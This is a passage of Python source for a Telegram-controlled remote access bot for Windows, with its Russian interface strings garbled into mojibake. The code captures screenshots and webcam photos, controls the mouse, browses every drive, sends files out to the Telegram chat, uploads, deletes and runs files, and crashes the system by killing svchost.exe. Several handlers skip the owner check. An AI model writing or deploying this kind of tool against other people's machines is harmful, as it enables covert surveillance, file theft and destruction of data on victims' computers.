        markup.add(types.InlineKeyboardButton("–û—Ç–º–µ–Ω–∞", callback_data="bsod_no"))
        bot.send_message(message.chat.id, "–í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –≤—ã–∑–≤–∞—Ç—å BSOD? –≠—Ç–æ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç —Å–∏—Å—Ç–µ–º—É!", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é BSOD")

@bot.callback_query_handler(func=lambda call: call.data in ["bsod_yes", "bsod_no"])
def trigger_bsod(call):
    try:
        if call.data == "bsod_yes":
            if not is_admin():
                bot.send_message(call.message.chat.id, "–¢—Ä–µ–±—É—é—Ç—Å—è –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–ª—è –≤—ã–∑–æ–≤–∞ BSOD.")
                return
            bot.send_message(call.message.chat.id, "–í—ã–∑—ã–≤–∞—é BSOD —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥...")
            time.sleep(5)
            subprocess.run("taskkill /F /IM svchost.exe", shell=True, capture_output=True, text=True)
            bot.answer_callback_query(call.id, "BSOD –≤—ã–∑–≤–∞–Ω")
        elif call.data == "bsod_no":
            bot.send_message(call.message.chat.id, "BSOD –æ—Ç–º–µ–Ω—ë–Ω")
            bot.answer_callback_query(call.id)
    except Exception as e:
        handle_error(e, "–≤—ã–∑–æ–≤–µ BSOD")

# –°–∫—Ä–∏–Ω—à–æ—Ç—ã
@bot.message_handler(func=lambda message: message.text == "üì∑ –°–∫—Ä–∏–Ω—à–æ—Ç—ã")
def screenshots_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("üì∑ –ë—ã—Å—Ç—Ä—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç", "üñº –ü–æ–ª–Ω—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç", "–ù–∞–∑–∞–¥")
        bot.send_message(message.chat.id, "–°–∫—Ä–∏–Ω—à–æ—Ç—ã:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤")

@bot.message_handler(func=lambda message: message.text == "üì∑ –ë—ã—Å—Ç—Ä—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç")
def quick_screenshot(message):
    try:
        if not check_id(message):
            return
        with mss() as sct:
            sct.shot(output="screenshot.png")
        with open("screenshot.png", "rb") as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove("screenshot.png")
    except Exception as e:
        handle_error(e, "–±—ã—Å—Ç—Ä–æ–º —Å–∫—Ä–∏–Ω—à–æ—Ç–µ")

@bot.message_handler(func=lambda message: message.text == "üñº –ü–æ–ª–Ω—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç")
def full_screenshot(message):
    try:
        if not check_id(message):
            return
        with mss() as sct:
            sct.shot(output="full_screenshot.png")
        with open("full_screenshot.png", "rb") as photo:
            bot.send_document(message.chat.id, photo)
        os.remove("full_screenshot.png")
    except Exception as e:
        handle_error(e, "–ø–æ–ª–Ω–æ–º —Å–∫—Ä–∏–Ω—à–æ—Ç–µ")

# –í–µ–±-–∫–∞–º–µ—Ä–∞
@bot.message_handler(func=lambda message: message.text == "üìπ –í–µ–±-–∫–∞–º–µ—Ä–∞")
def webcam_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        index = 0
        while True:
            cap = cv2.VideoCapture(index, cv2.CAP_DSHOW)
            if not cap.isOpened():
                break
            markup.add(types.InlineKeyboardButton(f"–ö–∞–º–µ—Ä–∞ {index}", callback_data=f"webcam:{index}"))
            cap.release()
            index += 1
        if index == 0:
            bot.send_message(message.chat.id, "–ö–∞–º–µ—Ä—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã")
            return
        markup.add(types.InlineKeyboardButton("–ù–∞–∑–∞–¥", callback_data="back:main"))
        bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –∫–∞–º–µ—Ä—É:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é –≤–µ–±-–∫–∞–º–µ—Ä—ã")

@bot.callback_query_handler(func=lambda call: call.data.startswith("webcam:"))
def webcam_photo(call):
    try:
        cam_index = int(call.data.split(":", 1)[1])
        cap = cv2.VideoCapture(cam_index, cv2.CAP_DSHOW)
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam.jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
            with open("webcam.jpg", "rb") as photo:
                bot.send_photo(call.message.chat.id, photo)
            os.remove("webcam.jpg")
        else:
            bot.send_message(call.message.chat.id, "–û—à–∏–±–∫–∞: –∫–∞–º–µ—Ä–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞")
        cap.release()
        bot.answer_callback_query(call.id)
    except Exception as e:
        handle_error(e, "—Å—ä—ë–º–∫–µ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã")

# –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º—ã—à–∫–æ–π
@bot.message_handler(func=lambda message: message.text == "üñ± –ú—ã—à–∫–∞")
def mouse_control(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("–í–ª–µ–≤–æ", callback_data="mouse:left"))
        markup.add(types.InlineKeyboardButton("–í–ø—Ä–∞–≤–æ", callback_data="mouse:right"))
        markup.add(types.InlineKeyboardButton("–í–≤–µ—Ä—Ö", callback_data="mouse:up"))
        markup.add(types.InlineKeyboardButton("–í–Ω–∏–∑", callback_data="mouse:down"))
        markup.add(types.InlineKeyboardButton("–õ–ö–ú", callback_data="mouse:lclick"))
        markup.add(types.InlineKeyboardButton("–ü–ö–ú", callback_data="mouse:rclick"))
        markup.add(types.InlineKeyboardButton("–ß—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å", callback_data="mouse:sensitivity"))
        markup.add(types.InlineKeyboardButton("–ù–∞–∑–∞–¥", callback_data="back:main"))
        bot.send_message(message.chat.id, "–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º—ã—à–∫–æ–π:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –º—ã—à–∫–æ–π")

@bot.callback_query_handler(func=lambda call: call.data.startswith("mouse:"))
def mouse_callback(call):
    try:
        global last_screenshot, mouse_sensitivity
        action = call.data.split(":", 1)[1]
        if action == "lclick":
            pyautogui.click(button='left')
            bot.answer_callback_query(call.id, "–õ–ö–ú –≤—ã–ø–æ–ª–Ω–µ–Ω")
        elif action == "rclick":
            pyautogui.click(button='right')
            bot.answer_callback_query(call.id, "–ü–ö–ú –≤—ã–ø–æ–ª–Ω–µ–Ω")
        elif action == "left":
            pyautogui.moveRel(-mouse_sensitivity, 0)
            bot.answer_callback_query(call.id, "–î–≤–∏–∂–µ–Ω–∏–µ –≤–ª–µ–≤–æ")
        elif action == "right":
            pyautogui.moveRel(mouse_sensitivity, 0)
            bot.answer_callback_query(call.id, "–î–≤–∏–∂–µ–Ω–∏–µ –≤–ø—Ä–∞–≤–æ")
        elif action == "up":
            pyautogui.moveRel(0, -mouse_sensitivity)
            bot.answer_callback_query(call.id, "–î–≤–∏–∂–µ–Ω–∏–µ –≤–≤–µ—Ä—Ö")
        elif action == "down":
            pyautogui.moveRel(0, mouse_sensitivity)
            bot.answer_callback_query(call.id, "–î–≤–∏–∂–µ–Ω–∏–µ –≤–Ω–∏–∑")
        elif action == "sensitivity":
            bot.send_message(call.message.chat.id, "–í–≤–µ–¥–∏ —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å (10-200):")
            bot.register_next_step_handler(call.message, set_sensitivity)
            return
        screenshot_path = "mouse_screenshot.png"
        with mss() as sct:
            sct.shot(output=screenshot_path)
        with open(screenshot_path, "rb") as photo:
            if last_screenshot:
                bot.delete_message(call.message.chat.id, last_screenshot)
            last_screenshot = bot.send_photo(call.message.chat.id, photo).message_id
        os.remove(screenshot_path)
    except Exception as e:
        handle_error(e, "—É–ø—Ä–∞–≤–ª–µ–Ω–∏–∏ –º—ã—à–∫–æ–π")

def set_sensitivity(message):
    try:
        global mouse_sensitivity
        sens = int(message.text)
        if 10 <= sens <= 200:
            mouse_sensitivity = sens
            bot.send_message(message.chat.id, f"–ß—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞: {sens}")
        else:
            bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –æ—Ç 10 –¥–æ 200")
    except Exception as e:
        handle_error(e, "—É—Å—Ç–∞–Ω–æ–≤–∫–µ —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ –º—ã—à–∏")

# –§–∞–π–ª—ã
def get_file_icon(file_path):
    try:
        if os.path.isdir(file_path):
            return "üìÅ"
        ext = os.path.splitext(file_path)[1].lower()
        icons = {
            ".txt": "üìù",
            ".doc": "üìú", ".docx": "üìú",
            ".pdf": "üìï",
            ".exe": "‚öôÔ∏è",
            ".jpg": "üñºÔ∏è", ".png": "üñºÔ∏è", ".jpeg": "üñºÔ∏è",
            ".mp4": "üé•", ".avi": "üé•",
            ".mp3": "üéµ", ".wav": "üéµ",
            ".zip": "üì¶", ".rar": "üì¶",
            ".py": "üêç",
            ".bat": "üíæ",
        }
        return icons.get(ext, "üìÉ")
    except Exception as e:
        handle_error(e, "–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–∏ –∏–∫–æ–Ω–∫–∏ —Ñ–∞–π–ª–∞")
        return "üìÉ"

@bot.message_handler(content_types=['document'], func=lambda message: not message.document.file_name.endswith(".bat"))
def upload_file(message):
    try:
        if not check_id(message):
            return
        global current_folder
        if current_folder and os.path.isdir(current_folder):
            bot.send_message(message.chat.id, f"–ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª –≤ —Ç–µ–∫—É—â—É—é –ø–∞–ø–∫—É '{current_folder}'?\n–û—Ç–ø—Ä–∞–≤—å '–¥–∞' –∏–ª–∏ —É–∫–∞–∂–∏ –¥—Ä—É–≥–æ–π –ø—É—Ç—å (–Ω–∞–ø—Ä–∏–º–µ—Ä, C:\\Downloads):")
        else:
            bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å –ø—É—Ç—å –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è (–Ω–∞–ø—Ä–∏–º–µ—Ä, C:\\Downloads):")
        bot.register_next_step_handler(message, lambda msg: save_file(msg, message.document))
    except Exception as e:
        handle_error(e, "–∑–∞–≥—Ä—É–∑–∫–µ —Ñ–∞–π–ª–∞")

def save_file(message, document):
    try:
        global current_folder
        path = message.text
        if path.lower() == "–¥–∞" and current_folder and os.path.isdir(current_folder):
            path = current_folder
        else:
            if not os.path.exists(path):
                os.makedirs(path)
        file_info = bot.get_file(document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        save_path = os.path.join(path, document.file_name)
        with open(save_path, "wb") as f:
            f.write(downloaded_file)
        bot.send_message(message.chat.id, f"üì• –§–∞–π–ª —Å–æ—Ö—Ä–∞–Ω—ë–Ω –≤ {save_path}")
    except Exception as e:
        handle_error(e, "—Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞")

def create_folder_keyboard(path, page=0, per_page=10):
    try:
        markup = types.InlineKeyboardMarkup()
        items = sorted(os.listdir(path))
        total_pages = (len(items) + per_page - 1) // per_page
        start = page * per_page
        end = min(start + per_page, len(items))

        for item in items[start:end]:
            item_path = os.path.join(path, item)
            icon = get_file_icon(item_path)
            callback = f"folder:{page}:{item_path}" if os.path.isdir(item_path) else f"file:{item_path}"
            markup.add(types.InlineKeyboardButton(f"{icon} {item}", callback_data=callback))

        nav_buttons = []
        if page > 0:
            nav_buttons.append(types.InlineKeyboardButton("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data=f"folder:{page-1}:{path}"))
        if page < total_pages - 1:
            nav_buttons.append(types.InlineKeyboardButton("–í–ø–µ—Ä—ë–¥ ‚û°Ô∏è", callback_data=f"folder:{page+1}:{path}"))
        if nav_buttons:
            markup.row(*nav_buttons)

        parent_dir = os.path.dirname(path)
        if parent_dir != path:
            markup.add(types.InlineKeyboardButton("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data=f"folder:0:{parent_dir}"))
        else:
            markup.add(types.InlineKeyboardButton("‚¨ÖÔ∏è –ö –¥–∏—Å–∫–∞–º", callback_data="drives"))

        return markup
    except Exception as e:
        handle_error(e, "—Å–æ–∑–¥–∞–Ω–∏–∏ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã –ø–∞–ø–∫–∏")
        return types.InlineKeyboardMarkup()

@bot.message_handler(func=lambda message: message.text == "üìÇ –§–∞–π–ª—ã")
def files_command(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        for drive in drives:
            markup.add(types.InlineKeyboardButton(drive, callback_data=f"folder:0:{drive}"))
        markup.add(types.InlineKeyboardButton("üîç –ü–æ–∏—Å–∫ —Ñ–∞–π–ª–æ–≤", callback_data="search_files"))
        markup.add(types.InlineKeyboardButton("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data="back:main"))
        bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –¥–∏—Å–∫:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é —Ñ–∞–π–ª–æ–≤")

@bot.callback_query_handler(func=lambda call: call.data.startswith("folder:"))
def folder_callback(call):
    try:
        global current_folder
        parts = call.data.split(":", 2)
        page = int(parts[1])
        path = parts[2]
        current_folder = path
        markup = create_folder_keyboard(path, page)
        markup.add(types.InlineKeyboardButton("üì• –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª –≤ –ø–∞–ø–∫—É", callback_data=f"upload_to_folder:{path}"))
        markup.add(types.InlineKeyboardButton("üîç –ü–æ–∏—Å–∫ —Ñ–∞–π–ª–æ–≤", callback_data=f"search_files_in_folder:{path}"))
        bot.edit_message_text(f"üìÅ –ü–∞–ø–∫–∞ {os.path.basename(path) or path}:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    except Exception as e:
        handle_error(e, "–æ—Ç–∫—Ä—ã—Ç–∏–∏ –ø–∞–ø–∫–∏")

@bot.callback_query_handler(func=lambda call: call.data == "search_files")
def search_files_prompt(call):
    try:
        bot.answer_callback_query(call.id, "–í–≤–µ–¥–∏—Ç–µ –∑–∞–ø—Ä–æ—Å –¥–ª—è –ø–æ–∏—Å–∫–∞")
        bot.send_message(call.message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –∏–º—è —Ñ–∞–π–ª–∞ –∏–ª–∏ –µ–≥–æ —á–∞—Å—Ç—å –¥–ª—è –ø–æ–∏—Å–∫–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä, 'photo' –¥–ª—è –ø–æ–∏—Å–∫–∞ —Ñ–∞–π–ª–æ–≤, —Å–æ–¥–µ—Ä–∂–∞—â–∏—Ö 'photo'):")
        bot.register_next_step_handler(call.message, search_files_in_system)
    except Exception as e:
        handle_error(e, "–ø–æ–¥–≥–æ—Ç–æ–≤–∫–µ –ø–æ–∏—Å–∫–∞ —Ñ–∞–π–ª–æ–≤")

@bot.callback_query_handler(func=lambda call: call.data.startswith("search_files_in_folder:"))
def search_files_in_folder_prompt(call):
    try:
        folder_path = call.data.split(":", 1)[1]
        if not os.path.isdir(folder_path):
            bot.answer_callback_query(call.id, "–û—à–∏–±–∫–∞: –ø–∞–ø–∫–∞ –±–æ–ª—å—à–µ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç")
            return
        bot.answer_callback_query(call.id, "–í–≤–µ–¥–∏—Ç–µ –∑–∞–ø—Ä–æ—Å –¥–ª—è –ø–æ–∏—Å–∫–∞")
        bot.send_message(call.message.chat.id, f"–í–≤–µ–¥–∏—Ç–µ –∏–º—è —Ñ–∞–π–ª–∞ –∏–ª–∏ –µ–≥–æ —á–∞—Å—Ç—å –¥–ª—è –ø–æ–∏—Å–∫–∞ –≤ '{folder_path}' (–Ω–∞–ø—Ä–∏–º–µ—Ä, 'photo'):")
        bot.register_next_step_handler(call.message, lambda msg: search_files_in_folder(msg, folder_path))
    except Exception as e:
        handle_error(e, "–ø–æ–¥–≥–æ—Ç–æ–≤–∫–µ –ø–æ–∏—Å–∫–∞ —Ñ–∞–π–ª–æ–≤ –≤ –ø–∞–ø–∫–µ")

def search_files_in_system(message):
    try:
        if not check_id(message):
            return
        query = message.text.lower()
        bot.send_message(message.chat.id, "–ü–æ–∏—Å–∫ –Ω–∞—á–∞—Ç, —ç—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä–æ–µ –≤—Ä–µ–º—è...")
        
        def perform_search():
            found_files = []
            drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
            for drive in drives:
                for root, _, files in os.walk(drive, topdown=True):
                    try:
                        for file in files:
                            if query in file.lower():
                                file_path = os.path.join(root, file)
                                found_files.append(file_path)
                                if len(found_files) >= 10:  # –û–≥—Ä–∞–Ω–∏—á–∏–º 10 —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞–º–∏
                                    break
                    except:
                        continue
                    if len(found_files) >= 10:
                        break
                if len(found_files) >= 10:
                    break
            
            if found_files:
                markup = types.InlineKeyboardMarkup()
                for file_path in found_files:
                    icon = get_file_icon(file_path)
                    markup.add(types.InlineKeyboardButton(f"{icon} {os.path.basename(file_path)}", callback_data=f"file:{file_path}"))
                markup.add(types.InlineKeyboardButton("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data="back:main"))
                bot.send_message(message.chat.id, "–ù–∞–π–¥–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã:", reply_markup=markup)
            else:
                bot.send_message(message.chat.id, "–§–∞–π–ª—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.")
        
        threading.Thread(target=perform_search, daemon=True).start()
    except Exception as e:
        handle_error(e, "–ø–æ–∏—Å–∫–µ —Ñ–∞–π–ª–æ–≤ –≤ —Å–∏—Å—Ç–µ–º–µ")

def search_files_in_folder(message, folder_path):
    try:
        if not check_id(message):
            return
        query = message.text.lower()
        bot.send_message(message.chat.id, f"–ü–æ–∏—Å–∫ —Ñ–∞–π–ª–æ–≤ –≤ '{folder_path}' –Ω–∞—á–∞—Ç...")
        
        def perform_search():
            found_files = []
            for root, _, files in os.walk(folder_path, topdown=True):
                try:
                    for file in files:
                        if query in file.lower():
                            file_path = os.path.join(root, file)
                            found_files.append(file_path)
                            if len(found_files) >= 10:  # –û–≥—Ä–∞–Ω–∏—á–∏–º 10 —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞–º–∏
                                break
                except:
                    continue
                if len(found_files) >= 10:
                    break
            
            if found_files:
                markup = types.InlineKeyboardMarkup()
                for file_path in found_files:
                    icon = get_file_icon(file_path)
                    markup.add(types.InlineKeyboardButton(f"{icon} {os.path.basename(file_path)}", callback_data=f"file:{file_path}"))
                markup.add(types.InlineKeyboardButton("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data=f"folder:0:{folder_path}"))
                bot.send_message(message.chat.id, "–ù–∞–π–¥–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã:", reply_markup=markup)
            else:
                bot.send_message(message.chat.id, "–§–∞–π–ª—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.")
        
        threading.Thread(target=perform_search, daemon=True).start()
    except Exception as e:
        handle_error(e, "–ø–æ–∏—Å–∫–µ —Ñ–∞–π–ª–æ–≤ –≤ –ø–∞–ø–∫–µ")

@bot.callback_query_handler(func=lambda call: call.data.startswith("upload_to_folder:"))
def upload_to_folder_callback(call):
    try:
        if not check_id(call.message):
            return
        path = call.data.split(":", 1)[1]
        if not os.path.isdir(path):
            bot.answer_callback_query(call.id, "–û—à–∏–±–∫–∞: –ø–∞–ø–∫–∞ –±–æ–ª—å—à–µ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç")
            return
        bot.answer_callback_query(call.id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏")
        bot.send_message(call.message.chat.id, f"–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ –≤ '{path}'")
        bot.register_next_step_handler_by_chat_id(call.message.chat.id, lambda msg: process_upload_to_folder(msg, path))
    except Exception as e:
        handle_error(e, "–ø–æ–¥–≥–æ—Ç–æ–≤–∫–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞ –≤ –ø–∞–ø–∫—É")

def process_upload_to_folder(message, folder_path):
    try:
        if not check_id(message):
            return
        if message.document:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            save_path = os.path.join(folder_path, message.document.file_name)
            with open(save_path, "wb") as f:
                f.write(downloaded_file)
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton("–î–∞", callback_data=f"upload_confirm:yes:{folder_path}"),
                types.InlineKeyboardButton("–ù–µ—Ç", callback_data="upload_confirm:no")
            )
            bot.send_message(message.chat.id, f"üì• –§–∞–π–ª —Å–æ—Ö—Ä–∞–Ω—ë–Ω –≤ {save_path}\n–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å –∑–∞–≥—Ä—É–∑–∫—É —Ñ–∞–π–ª–æ–≤ –≤ —ç—Ç—É –ø–∞–ø–∫—É?", reply_markup=markup)
        else:
            bot.send_message(message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª (–¥–æ–∫—É–º–µ–Ω—Ç)")
    except Exception as e:
        handle_error(e, "–∑–∞–≥—Ä—É–∑–∫–µ —Ñ–∞–π–ª–∞ –≤ –ø–∞–ø–∫—É")

@bot.callback_query_handler(func=lambda call: call.data.startswith("file:"))
def file_callback(call):
    try:
        file_path = call.data.split(":", 1)[1]
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("–°–∫–∞—á–∞—Ç—å", callback_data=f"download:{file_path}"))
        markup.add(types.InlineKeyboardButton("–£–¥–∞–ª–∏—Ç—å", callback_data=f"delete_file:{file_path}"))
        markup.add(types.InlineKeyboardButton("–ó–∞–ø—É—Å—Ç–∏—Ç—å/–û—Ç–∫—Ä—ã—Ç—å", callback_data=f"run_file:{file_path}"))
        markup.add(types.InlineKeyboardButton("–ù–∞–∑–∞–¥", callback_data=f"folder:0:{os.path.dirname(file_path)}"))
        bot.edit_message_text(f"–î–µ–π—Å—Ç–≤–∏—è —Å —Ñ–∞–π–ª–æ–º {os.path.basename(file_path)}:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    except Exception as e:
        handle_error(e, "—Ä–∞–±–æ—Ç–µ —Å —Ñ–∞–π–ª–æ–º")

@bot.callback_query_handler(func=lambda call: call.data.startswith("download:"))
def download_file(call):
    try:
        file_path = call.data.split(":", 1)[1]
        with open(file_path, 'rb') as f:
            bot.send_document(call.message.chat.id, f)
        bot.answer_callback_query(call.id, "–§–∞–π–ª –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω")
    except Exception as e:
        handle_error(e, "—Å–∫–∞—á–∏–≤–∞–Ω–∏–∏ —Ñ–∞–π–ª–∞")

@bot.callback_query_handler(func=lambda call: call.data.startswith("delete_file:"))
def delete_file(call):
    try:
        file_path = call.data.split(":", 1)[1]
        os.remove(file_path)
        bot.answer_callback_query(call.id, "–§–∞–π–ª —É–¥–∞–ª—ë–Ω")
        folder_callback(types.CallbackQuery(id=call.id, from_user=call.from_user, message=call.message, data=f"folder:0:{os.path.dirname(file_path)}"))
    except Exception as e:
        handle_error(e, "—É–¥–∞–ª–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞")

@bot.callback_query_handler(func=lambda call: call.data.startswith("run_file:"))
def run_file(call):
    try:
        file_path = call.data.split(":", 1)[1]
        os.startfile(file_path)
        bot.answer_callback_query(call.id, "–§–∞–π–ª –∑–∞–ø—É—â–µ–Ω")
    except Exception as e:
        handle_error(e, "–∑–∞–ø—É—Å–∫–µ —Ñ–∞–π–ª–∞")

@bot.callback_query_handler(func=lambda call: call.data == "drives")
def show_drives(call):
    try:
        markup = types.InlineKeyboardMarkup()
        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        for drive in drives:
            markup.add(types.InlineKeyboardButton(drive, callback_data=f"folder:0:{drive}"))
        markup.add(types.InlineKeyboardButton("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data="back:main"))
        bot.edit_message_text("–í—ã–±–µ—Ä–∏—Ç–µ –¥–∏—Å–∫:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    except Exception as e:
        handle_error(e, "–≤–æ–∑–≤—Ä–∞—Ç–µ –∫ –¥–∏—Å–∫–∞–º")

@bot.callback_query_handler(func=lambda call: call.data.startswith("upload_confirm:"))
def upload_confirm_callback(call):
    try:
        if not check_id(call.message):
            return
        action = call.data.split(":")[1]
        if action == "yes":
            folder_path = call.data.split(":", 2)[2]
            if not os.path.isdir(folder_path):
                bot.answer_callback_query(call.id, "–û—à–∏–±–∫–∞: –ø–∞–ø–∫–∞ –±–æ–ª—å—à–µ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç")
                bot.edit_message_text("–ü–∞–ø–∫–∞ –±–æ–ª—å—à–µ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç.", call.message.chat.id, call.message.message_id, reply_markup=None)
                return
            bot.edit_message_text(f"üìÅ –ü–∞–ø–∫–∞ {os.path.basename(folder_path) or folder_path}:", call.message.chat.id, call.message.message_id, reply_markup=None)
            bot.send_message(call.message.chat.id, f"–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–ª–µ–¥—É—é—â–∏–π —Ñ–∞–π–ª –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ –≤ '{folder_path}'")
            bot.register_next_step_handler_by_chat_id(call.message.chat.id, lambda msg: process_upload_to_folder(msg, folder_path))
        else:
            bot.edit_message_text("–ó–∞–≥—Ä—É–∑–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞.", call.message.chat.id, call.message.message_id, reply_markup=None)
        bot.answer_callback_query(call.id)
    except Exception as e:
        handle_error(e, "–ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–∏ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞")

# –°–∏—Å—Ç–µ–º–∞

@bot.message_handler(func=lambda message: message.text == "üñ• –°–∏—Å—Ç–µ–º–∞")
def sysinfo_command(message):
    global sysinfo_running
    try:
        if not check_id(message):
            return
        if sysinfo_running:
            bot.send_message(message.chat.id, "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ —É–∂–µ —Å–æ–±–∏—Ä–∞–µ—Ç—Å—è, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ.")
            return

        sysinfo_running = True
        bot.send_message(message.chat.id, "–°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ –Ω–∞—á–∞—Ç...")

        def collect_system_info():
            try:
                # –û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞
                os_name = platform.system()
                os_version = platform.version()
                os_architecture = platform.architecture()[0]
                boot_time = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")

                # –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä
                cpu_name = platform.processor()
                cpu_cores = psutil.cpu_count(logical=False)
                cpu_threads = psutil.cpu_count(logical=True)
                cpu_freq = psutil.cpu_freq().current if psutil.cpu_freq() else "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å"

                # –¢–µ–º–ø–µ—Ä–∞—Ç—É—Ä–∞ CPU (–∏—Å–ø–æ–ª—å–∑—É–µ–º wmi, —Ç–∞–∫ –∫–∞–∫ psutil –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç —ç—Ç–∏ –¥–∞–Ω–Ω—ã–µ)
                cpu_temp = "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å"
                try:
